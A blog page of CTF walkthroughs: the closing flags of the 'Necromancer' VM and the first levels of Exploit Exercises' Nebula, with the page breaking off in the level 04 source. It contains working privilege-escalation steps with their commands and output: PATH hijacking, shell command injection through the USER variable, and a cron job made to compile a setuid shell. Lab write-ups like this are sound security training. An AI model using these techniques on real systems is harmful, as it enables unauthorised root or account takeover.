<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 777 10.0.2.10</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-01 13:59 CEST</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">777/udp open|filtered multiling-http</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds</span><br><span class="line"></span><br><span class="line">root@kali:~/ctf/necromancer# netcat -ul -p 777</span><br></pre></td></tr></table></figure>
<h3 id="Flags-8-10-An-intense-battle"><a href="#Flags-8-10-An-intense-battle" class="headerlink" title="Flags 8-10: An intense battle"></a>Flags 8-10: An intense battle</h3><p>UDP Port 777 is neither open on the Necromancer’s machine nor are we contacted on said port. That means we will fight at the Necromancer own battlefield an log back in:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ nc -O 30 -u localhost 777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 3 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Where do the Black Robes practice magic of the Greater Path?  Kelewan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag8&#123;55a6af2ca3fee9f2fef81d20743bda2c&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 3 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who did Johann Faust VIII make a deal with?  Devil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 2 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who did Johann Faust VIII make a deal with?  Mephistopheles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag9&#123;713587e17e796209d1df4c9c2c2d2966&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 2 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who is tricked into passing the Ninth Gate?  Hedge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag10&#123;8dc6486d2c63cafcdc6efbba2be98ee4&#125;</span><br><span class="line"></span><br><span class="line">A great flash of light knocks you to the ground; momentarily blinding you!</span><br><span class="line"></span><br><span class="line">As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.</span><br><span class="line"></span><br><span class="line">An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.</span><br><span class="line"></span><br><span class="line">The room is silent.</span><br><span class="line"></span><br><span class="line">You walk over to where the Necromancer once stood.</span><br><span class="line"></span><br><span class="line">On the ground is a small vile.</span><br></pre></td></tr></table></figure>
<h3 id="Last-Flag-The-strength-to-win"><a href="#Last-Flag-The-strength-to-win" class="headerlink" title="Last Flag: The strength to win"></a>Last Flag: The strength to win</h3><p>We survived due to the help of Wikipedia (I do admit that I failed this challenge at first, resulting in a complete reset of the Necromancer VM). The Necromancer is gone and the vile is our only hint.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x  3 demonslayer  demonslayer  512 Sep 13 11:14 .</span><br><span class="line">drwxr-xr-x  3 root         wheel        512 May 11  2016 ..</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer   87 May 11  2016 .Xdefaults</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  773 May 11  2016 .cshrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  103 May 11  2016 .cvsrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  359 May 11  2016 .login</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  175 May 11  2016 .mailrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  218 May 11  2016 .profile</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  196 Sep 13 11:02 .smallvile</span><br><span class="line">drwx------  2 demonslayer  demonslayer  512 May 11  2016 .ssh</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  706 May 11  2016 flag8.txt</span><br><span class="line">$ cat .smallvile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You pick up the small vile.</span><br><span class="line"></span><br><span class="line">Inside of it you can see a green liquid.</span><br><span class="line"></span><br><span class="line">Opening the vile releases a pleasant odour into the air.</span><br><span class="line"></span><br><span class="line">You drink the elixir and feel a great power within your veins!</span><br></pre></td></tr></table></figure>
<p>We can literally feel that we are oozing power. There is a certain desire to know how far our new gained powers go:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for demonslayer on thenecromancer:</span><br><span class="line">    env_keep+=&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;</span><br><span class="line"></span><br><span class="line">User demonslayer may run the following commands on thenecromancer:</span><br><span class="line">    (ALL) NOPASSWD: /bin/cat /root/flag11.txt</span><br></pre></td></tr></table></figure>
<p>Yeah, we are mighty enough to see the next flag on the horizon.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat /root/flag11.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Suddenly you feel dizzy and fall to the ground!</span><br><span class="line"></span><br><span class="line">As you open your eyes you find yourself staring at a computer screen.</span><br><span class="line"></span><br><span class="line">Congratulations!!! You have conquered......</span><br><span class="line"></span><br><span class="line">          .                                                      .</span><br><span class="line">        .n                   .                 .                  n.</span><br><span class="line">  .   .dP                  dP                   9b                 9b.    .</span><br><span class="line"> 4    qXb         .       dX                     Xb       .        dXp     t</span><br><span class="line">dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb</span><br><span class="line">9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP</span><br><span class="line"> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP</span><br><span class="line">  `9XXXXXXXXXXXXXXXXXXXXX&apos;~   ~`OOO8b   d8OOO&apos;~   ~`XXXXXXXXXXXXXXXXXXXXXP&apos;</span><br><span class="line">    `9XXXXXXXXXXXP&apos; `9XX&apos;          `98v8P&apos;          `XXP&apos; `9XXXXXXXXXXXP&apos;</span><br><span class="line">        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~</span><br><span class="line">                        )b.  .dbo.dP&apos;`v&apos;`9b.odb.  .dX(</span><br><span class="line">                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.</span><br><span class="line">                     dXXXXXXXXXXXP&apos;   .   `9XXXXXXXXXXXb</span><br><span class="line">                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb</span><br><span class="line">                    9XXb&apos;   `XXXXXb.dX|Xb.dXXXXX&apos;   `dXXP</span><br><span class="line">                     `&apos;      9XXXXXX(   )XXXXXXP      `&apos;</span><br><span class="line">                              XXXX X.`v&apos;.X XXXX</span><br><span class="line">                              XP^X&apos;`b   d&apos;`X^XX</span><br><span class="line">                              X. 9  `   &apos;  P )X</span><br><span class="line">                              `b  `       &apos;  d&apos;</span><br><span class="line">                               `             &apos;                       </span><br><span class="line">                               THE NECROMANCER!</span><br><span class="line">                                 by  @xerubus</span><br><span class="line"></span><br><span class="line">                   flag11&#123;42c35828545b926e79a36493938ab1b1&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Big shout out to Dook and Bull for being test bunnies.</span><br><span class="line"></span><br><span class="line">Cheers OJ for the obfuscation help.</span><br><span class="line"></span><br><span class="line">Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.</span><br><span class="line"></span><br><span class="line">&quot;=========================================&quot;</span><br><span class="line">&quot;  xerubus (@xerubus) - www.mogozobo.com  &quot;</span><br><span class="line">&quot;=========================================&quot;</span><br></pre></td></tr></table></figure>
<p>That’s it, we have conquered the Necromancer. That took quite some time, but it was time well spent as a learning experience packaged in an unusual story.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://erikgeiser.github.io/2017/12/17/necromancer/" data-id="cjju038bu0003uzbqcpy6rbsw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Writeups/">CTF-Writeups</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-nebula" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/15/nebula/" class="article-date">
  <time datetime="2017-03-15T14:43:28.000Z" itemprop="datePublished">2017-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/03/15/nebula/">Nebula</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>This is a writeup of the Nebula CTF from <a href="https://exploit-exercises.com/" target="_blank" rel="noopener">Exploit Exercises</a>. Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and one might still learn something new in different writeups. Also it is nice to have a reference of problems ones has solved at some point.</p>
<p>Enough talk! Let’s jump in…</p>
<h2 id="Level-00"><a href="#Level-00" class="headerlink" title="Level 00"></a>Level 00</h2><p>The levels are accompanied by hints that explain what the level is all about. Here is the first one:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</span><br><span class="line"></span><br><span class="line">Alternatively, look at the find man page.</span><br><span class="line"></span><br><span class="line">To access this level, log in as level00 with the password of level00.</span><br></pre></td></tr></table></figure>
<p>This is not much of a challenge since the solution is right there: Search in the man page for the appropriate flags. One could go about it like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level00@nebula:~$ find / -perm -4000 -user flag00 2&gt; /dev/null</span><br><span class="line">/bin/.../flag00</span><br><span class="line">/rofs/bin/.../flag00</span><br></pre></td></tr></table></figure>
<p>Note the minus in front of the 4000 that references the <code>setuid</code> flag. This is neccessary because we do not know anything about the permissions other than that one flag and the minus allows us to probe just for that. When doing such <code>find</code> searches in <code>/</code> it is also helpful to redirect <code>stderr</code> (<code>2&gt; /dev/null</code>) such that there is no <code>Permission denied</code> spam.</p>
<p>Now we can claim the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">level00@nebula:~$ <span class="built_in">cd</span> /rofs/bin/...</span><br><span class="line">level00@nebula:/rofs/bin/...$ ls</span><br><span class="line">flag00</span><br><span class="line">level00@nebula:/rofs/bin/...$ ./flag00</span><br><span class="line">Congrats, now run getflag to get your flag!</span><br><span class="line">flag00@nebula:/rofs/bin/...$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-01"><a href="#Level-01" class="headerlink" title="Level 01"></a>Level 01</h2><p>This time we are given the following source code for a <code>setuid</code> binary in <code>/home/flag01</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">"/usr/bin/env echo and now what?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It is useful to know that the man pages contain the documentation of the functions that are used here. This program basically sets the real user id (which is <code>level01</code>) to the effective user id (<code>flag01</code>, due to the <code>setuid</code> bit). That way the command <code>/usr/bin/env echo and now what?</code> will be executed as <code>flag01</code>. The fact that we can change the environment variables loaded by <code>/usr/bin/env</code> allows us to manipulate this command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level01@nebula:/home/flag01$ <span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; /tmp/<span class="built_in">echo</span></span><br><span class="line">level01@nebula:/home/flag01$ chmod a+x /tmp/<span class="built_in">echo</span></span><br><span class="line">level01@nebula:/home/flag01$ PATH=/tmp:<span class="variable">$PATH</span> ./flag01</span><br><span class="line">flag01@nebula:/home/flag01$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>I created a fake <code>echo</code> that just redirects to a shell and added it as the first element to the <code>$PATH</code> environment variable. This way the system will find the faked <code>echo</code> first, effectively replacing <code>echo</code> with <code>/bin/bash</code> in the command. Thus, we land in a shell from the <code>flag01</code> user due to the <code>setresgid/setresuid</code> calls.</p>
<h2 id="Flag-02"><a href="#Flag-02" class="headerlink" title="Flag 02"></a>Flag 02</h2><p>We have to exploit the following code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  asprintf(&amp;buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</span><br><span class="line"></span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The permission preamble is the same as in the last flag but now we have the possibility to change a buffer that is executed via the <code>$USER</code> environment variable. The is also a <code>printf</code> that shows us what we are doing.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">level02@nebula:/home/flag02$ ./flag02</span><br><span class="line">about to call system(&quot;/bin/echo level02 is cool&quot;)</span><br><span class="line">level02 is cool</span><br><span class="line">level02@nebula:/home/flag02$ USER=&quot;test &amp;&amp; /bin/bash &amp;&amp;&quot; ./flag02</span><br><span class="line">about to call system(&quot;/bin/echo test &amp;&amp; /bin/bash &amp;&amp; is cool&quot;)</span><br><span class="line">test</span><br><span class="line">flag02@nebula:/home/flag02$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>Setting <code>$USER</code> to <code>test &amp;&amp; /bin/bash &amp;&amp;</code> splits the executed command into three separate commands that are executed subsequently: First the is <code>/bin/echo test</code>, which just prints <code>test</code>, then we open a shell to get the flag, then <code>is cool</code> is executed. This is not a valid command but at this point we don’t care anymore as we already have the flag.</p>
<h2 id="Flag-03"><a href="#Flag-03" class="headerlink" title="Flag 03"></a>Flag 03</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Check the home directory of flag03 and take note of the files there.</span><br><span class="line"></span><br><span class="line">There is a crontab that is called every couple of minutes.</span><br><span class="line"></span><br><span class="line">To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</span><br></pre></td></tr></table></figure>
<p>So let’s have a look at the directory:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ ls</span><br><span class="line">writable.d  writable.sh</span><br><span class="line">level03@nebula:/home/flag03$ cat writable.sh</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></span><br><span class="line">	(<span class="built_in">ulimit</span> -t 5; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</span><br><span class="line">	rm -f <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">level03@nebula:/home/flag03$ ls writable.d</span><br><span class="line">level03@nebula:/home/flag03$</span><br></pre></td></tr></table></figure>
<p>So we have a crontab that executes <code>writable.sh</code> every couple of minutes, which executes everything in <code>writable.d</code> (with a 5s timeout) and removes it afterwards.</p>
<p>One can go about it in a few different ways depending on what one considers getting the flag. My first idea does not give shell access but still executes <code>getflag</code> and shows the output:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ <span class="built_in">echo</span> <span class="string">"getflag | nc 127.0.0.1 3333"</span> &gt; writable.d/test.sh; nc -l 3333</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>In this case, the command exectured by the cronjob is <code>getflag | nc 127.0.0.1 3333</code> which executes getflag and sends the output to port 3333 on the same host. Before the cronjob is executed we make sure to start a listener on said port with <code>nc -l 3333</code> which receives the target string. In hinsight it would probably be easer to have the cronjob just dump the string in a file with read permissions.</p>
<p>However, in a realistic scenario it would be way better to get complete shell access so we try and aim for that using a similar technique to the previous challenges: We write a little program in C and let the cronjob which runs as <code>flag03</code> compile it and set the <code>setuid</code> bit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ cat &lt;&lt; EOF &gt; /tmp/getflag.c</span><br><span class="line">&gt; #include &lt;stdio.h&gt;</span><br><span class="line">&gt; #include &lt;stdlib.h&gt;</span><br><span class="line">&gt; #include &lt;sys/types.h&gt;</span><br><span class="line">&gt; #include &lt;unistd.h&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; int main()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;   gid_t gid = getegid();</span><br><span class="line">&gt;   uid_t uid = geteuid();</span><br><span class="line">&gt;   setresgid(gid, gid, gid);</span><br><span class="line">&gt;   setresuid(uid, uid, uid);</span><br><span class="line">&gt;   system(&quot;/bin/bash&quot;);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">level03@nebula:/home/flag03$ ls</span><br><span class="line">writable.d  writable.sh</span><br><span class="line">level03@nebula:/home/flag03$ echo &quot;gcc /tmp/getflag.c -o /home/flag03/getflag; chmod +s /home/flag03/getflag&quot; &gt; writable.d/getflag.sh</span><br><span class="line">level03@nebula:/home/flag03$ ./getflag</span><br><span class="line">flag03@nebula:/home/flag03$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>I do want to mention an issue I had while working out the solution so that I’m not the only one that learned from it: First I instructed the compiler to place the executable in the <code>/tmp</code> folder so that I don’t pollute <code>/home</code>. The problem is that the <code>suid</code> bit did not seem to work unless I build the executable in the <code>/home</code> directory. So I searched for reasons why <code>suid</code> may be directory dependent and found the <code>nosuid</code> mount flag. One can easily check if that is the reason in this case:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag03@nebula:/home/flag03$ cat /etc/fstab</span><br><span class="line">overlayfs / overlayfs rw 0 0</span><br><span class="line">tmpfs /tmp tmpfs nosuid,nodev 0 0</span><br></pre></td></tr></table></figure>
<p>Indeed the <code>/tmp</code> folder is mounted as a <code>tmpfs</code> in RAM with the <code>nosuid</code> flag set such that <code>suid</code> has no effect there.</p>
<h2 id="Level-04"><a href="#Level-04" class="headerlink" title="Level 04:"></a>Level 04:</h2><p>The source code of <code>flag04</code> reads and prints a file after it makes sure that the filename does not contain “token” which is probably exactly the file we need to open. For those that are not that familiar with C code, the last write has a 1 as file descriptor argument which references the file descriptor of <code>stdout</code>, thus the write is basically a print.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">int</span> fd, rc;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) 